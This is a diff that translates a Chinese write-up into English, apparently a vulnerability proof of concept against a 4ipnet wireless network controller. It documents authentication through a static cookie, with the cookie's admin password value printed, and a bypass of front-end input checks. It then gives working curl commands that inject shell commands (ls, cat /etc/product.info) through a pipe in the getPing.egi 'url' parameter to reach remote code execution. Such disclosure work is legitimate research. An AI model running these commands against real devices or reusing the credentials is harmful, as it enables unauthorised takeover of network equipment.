@@ -14,31 +14,31 @@ Location: http://{host}/login.asp
 ```
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_1ab1ac81f80c42b992f6c4fc96be40e8.png)
 
-從該網頁服務登入頁面，發現為 4ipnet 無線網路控制器
+After accessing the login page of the web service, it was discovered to be a 4ipnet wireless network controller
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_247c7496749603bc7b9772d11afd7ba4.png)
 
 
-**查詢網路教學，取得該 IOT 預設密碼**
+**Search online articles to obtain the default password for the device.**
 
-**Web console 功能**
-系統概述
+**Web console features**
+Overview
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_fa6cb02d32f831033c013c4142586a4f.png)
 
-管理介面有 `Home > Utilities > Network Utilities` 功能，可透過網頁執行 ping, tracert, arping 等網路測試行為
+The management interface has the Home > Utilities > Network Utilities feature, allowing network tests such as ping, tracert, arping, etc., to be performed through the web page
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_9925e6bd58df1d54d022f404504adbef.png)
 
-## 漏洞 PoC
+## Exploit PoC
 **PoC I @ Browser**
 
-前端有做 input text 檢測，驗證 input text 是否合規
+The front-end performs input text validation to check whether the input text is compliant
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_0d41715f59b4037ce1b9dcea6c9d31ce.png)
 
-改由後端下手，從 network 確認 http request 特徵
+Turn to the backend, verify HTTP request characteristics from the network
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_b87e4fa1fea137d1feba67001f4ca104.png)
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_354d5ac2dd8284e800fa818cf166f489.png)
 
 
-http request 特徵
+http request characteristics
 ```asp!
 # request 1
 http://{host}/getPing.egi?url=127.0.0.1
@@ -47,37 +47,32 @@ http://{host}/getPing.egi?url=127.0.0.1
 http://{host}/getPing.egi?pid=940
 ```
 :::info
-可發現其 ping 功能為先將 `url` 作為 query string 參數送出，並取得 `pid`, 再批次透過 `pid` 參數取得 ping output，最終將結果呈現至網頁
+It can be observed that its ping function first sends the url as a query string parameter, obtains the pid, then retrieves ping output in batches through the pid parameter, and finally presents the results on the web page
 :::
 
-發現該管理介面僅依賴 cookie name/value 作為 user 身分證驗依據。
-
-
+It was found that the management interface relies solely on the cookie name/value as the basis for user identification
 | Name | Value |
 | -------- | -------- |
 | username     | admin    |
 | password     |  17lgP6vqCV1Ko   |
 
 :::danger
-使用同 1 組帳密(admin)不論重新登入幾次，cookie 內容均不變
-:::
+Using the same set of credentials (admin), regardless of how many times you log in, the content of the cookie remains unchanged:::
 
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_3ecdb0b545bf10be16816293036534e8.png)
 
 
 **PoC II @ cmd**
 
-使用 curl 工具模擬 http request 存取管理介面 home page，被導入登入頁面
-
+Using the curl tool to simulate an HTTP request to access the management interface home page, I was redirected to the login page
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_f3925ef9b1edaae1b762ad800322d80d.png)
 
-使用 curl 工具模擬 http request 並帶入上述取得 cookie，證實可使用需驗證身分授權之管理介面 home page
+Using the curl tool to simulate an HTTP request and including the aforementioned obtained cookie, it was confirmed that access to the authenticated management interface home page is possible
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_a76b368249757b325d6f3bcc4ab24d88.png)
 
-嘗試存取 `getPing.egi` 頁面，並將 query string 參數`url` 使用escape 特殊字元(`;`,`|`)嘗試跳脫後並注入指定 command
-
+Attempted to access the `getPing.egi` page and escape the query string parameter url using special characters (;, |) in an attempt to evade security and inject a specified command
 **Attemp I with `;`**
-被後端程式檢測為不合法字元
+Detected as invalid characters by the backend program.
 ```zsh!
 ❯ curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=127.0.0.1;"
 HTTP/1.1 200 OK
@@ -95,7 +90,7 @@ OK%
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_6b5b52a9a94d27f7ace8850892ba7f77.png)
 
 **Attemp II with `|`**
-成功跳脫!!! 並取得 `pid`!!!
+Successful escape!!! and obtained pid!!!
 
 ```zsh!
 ❯ curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=127.0.0.1|"
@@ -112,13 +107,13 @@ Keep-Alive: timeout=60, max=100
 ```
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_77cdaa3fe2e0c85b8506ec8aa926a65b.png)
 
-注入`ls` 列出當前目錄
+Inject Target with `ls` to list the current directory.
 ```zsh!
  curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=|ls"
  ```
 ![image](https://github.com/yckuo-sdc/PoC/blob/master/image/upload_686276a082e16b2f204e75e987d55b0f.png)
 
-注入`ls -l` 列出當前目錄結構，檔案權限,檔案類型，修改日期等資訊
+Inject Target with `ls -l` to display the current directory structure, file permissions, file types, modification dates, and other information."
 ```zsh!
  curl -i -b "username=admin; password=17lgP6vqCV1Ko" "http://{host}/getPing.egi?url=|ls%20-l"
  ```
@@ -126,11 +121,11 @@ Keep-Alive: timeout=60, max=100
 
 
 :::success
-證實該產品存在遠端程式碼執行(RCE)漏洞， 可透過傳入`url` parameter: input_text + pipe + command 執行任意指令
+Confirmed the presence of a Remote Code Execution (RCE) vulnerability in the product. Arbitrary commands can be executed by passing the url parameter: input_text + pipe + command
 :::
 
 
-## 確認設備廠牌型號
+## Verify the device brand and model.
 ```zsh!
 curl -b "username=admin; password=17lgP6vqCV1Ko" "{host}/getPing.egi?url=|cat%20/etc/product.info"
 ```
